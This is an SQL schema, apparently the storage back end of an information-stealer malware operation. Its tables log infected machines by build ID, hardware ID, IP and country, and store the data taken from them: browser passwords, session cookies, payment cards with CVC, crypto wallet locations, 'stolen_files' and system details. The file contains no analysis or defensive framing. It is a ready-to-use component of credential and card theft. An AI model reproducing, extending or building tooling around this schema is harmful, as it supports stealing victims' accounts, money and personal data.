CREATE TABLE IF NOT EXISTS sessions (
    id           TEXT PRIMARY KEY,
    build_id     TEXT,
    hwid         TEXT,
    os           TEXT,
    username     TEXT,
    ip           TEXT,
    country_code TEXT,
    created_at   TIMESTAMP WITHOUT TIME ZONE DEFAULT CURRENT_TIMESTAMP
);
CREATE INDEX IF NOT EXISTS idx_sessions_created ON sessions(created_at DESC);
CREATE INDEX IF NOT EXISTS idx_sessions_country ON sessions(country_code);
CREATE INDEX IF NOT EXISTS idx_sessions_hwid ON sessions(hwid);

CREATE TABLE IF NOT EXISTS passwords (
    id             TEXT PRIMARY KEY,
    session_id     TEXT NOT NULL REFERENCES sessions(id) ON DELETE CASCADE,
    url            TEXT,
    username       TEXT,
    password_value TEXT,
    browser        TEXT
);
CREATE INDEX IF NOT EXISTS idx_passwords_session ON passwords(session_id);
CREATE INDEX IF NOT EXISTS idx_passwords_url ON passwords(url);

CREATE TABLE IF NOT EXISTS cookies (
    id         TEXT PRIMARY KEY,
    session_id TEXT NOT NULL REFERENCES sessions(id) ON DELETE CASCADE,
    domain     TEXT,
    name       TEXT,
    value      TEXT,
    path       TEXT
);
CREATE INDEX IF NOT EXISTS idx_cookies_session ON cookies(session_id);

CREATE TABLE IF NOT EXISTS cards (
    id         TEXT PRIMARY KEY,
    session_id TEXT NOT NULL REFERENCES sessions(id) ON DELETE CASCADE,
    number     TEXT,
    exp_month  TEXT,
    exp_year   TEXT,
    holder     TEXT,
    cvc        TEXT
);
CREATE INDEX IF NOT EXISTS idx_cards_session ON cards(session_id);

CREATE TABLE IF NOT EXISTS wallets (
    id         TEXT PRIMARY KEY,
    session_id TEXT NOT NULL REFERENCES sessions(id) ON DELETE CASCADE,
    name       TEXT,
    path       TEXT
);
CREATE INDEX IF NOT EXISTS idx_wallets_session ON wallets(session_id);

CREATE TABLE IF NOT EXISTS stolen_files (
    id         TEXT PRIMARY KEY,
    session_id TEXT NOT NULL REFERENCES sessions(id) ON DELETE CASCADE,
    filename   TEXT,
    size       INTEGER
);
CREATE INDEX IF NOT EXISTS idx_files_session ON stolen_files(session_id);

CREATE TABLE IF NOT EXISTS system_info (
    session_id TEXT PRIMARY KEY REFERENCES sessions(id) ON DELETE CASCADE,
    cpu        TEXT,
    gpu        TEXT,
    ram        TEXT,
    os         TEXT,
    screen     TEXT,
    hostname   TEXT,
    local_ip   TEXT,
    mac        TEXT,
    public_ip  TEXT,
    hwid       TEXT,
    uptime     TEXT
);
